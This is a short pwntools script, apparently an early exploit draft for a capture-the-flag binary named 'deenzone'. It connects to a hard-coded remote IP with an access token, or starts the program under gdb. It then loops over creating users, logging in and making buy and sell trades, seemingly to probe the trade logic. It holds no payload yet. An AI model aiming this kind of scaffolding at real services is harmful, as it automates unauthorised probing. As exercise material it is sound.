from pwn import *
elf_file = FILENAME = './deenzone'
elf = context.binary = ELF(elf_file)
#context.log_level = 'debug' # output verbose log



HOST = '52.234.157.82'
POST = 38189


if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''b main''')

# 99 > num_trade
def Access():
    access_code = 'eDiQ2EMrjmrgsswKS5OiZRQe'
    c.sendlineafter('token to continue:\n',access_code)

def CreateUser(name):
    c.sendlineafter('>','1')
    c.sendlineafter('username>',str(name))
    c.sendlineafter('password>',str(name))

def Login(name):
    c.sendlineafter('>','2')
    c.sendlineafter('username>',str(name))
    c.sendlineafter('password>',str(name))


def Buy(Ticker,Quantity,Price):
    c.sendlineafter('>','1')
    c.sendlineafter('>',Ticker)
    c.sendlineafter('>',Quantity)
    c.sendlineafter('>',Price)

def Sell(Ticker,Quantity,Price):
    c.sendlineafter('>','2')
    c.sendlineafter('>',Ticker)
    c.sendlineafter('>',Quantity)
    c.sendlineafter('>',Price)


def ViewAccountInfo():
    c.sendlineafter('>','3')
    c.recvuntil('ticker: ')
    ticker = c.recvline().replace("\n",'')
    return ticker

def Exit():
    c.sendlineafter('>','8')
    c.sendlineafter('>','3')

def Logout():
    c.sendlineafter('>','8')


Access()

for i in range(10):
  print(i)
  CreateUser(i)
  Login(i)
  Buy('Ramon Pena','1','21')
  Sell('Ramon Pena','1','6')
  Logout()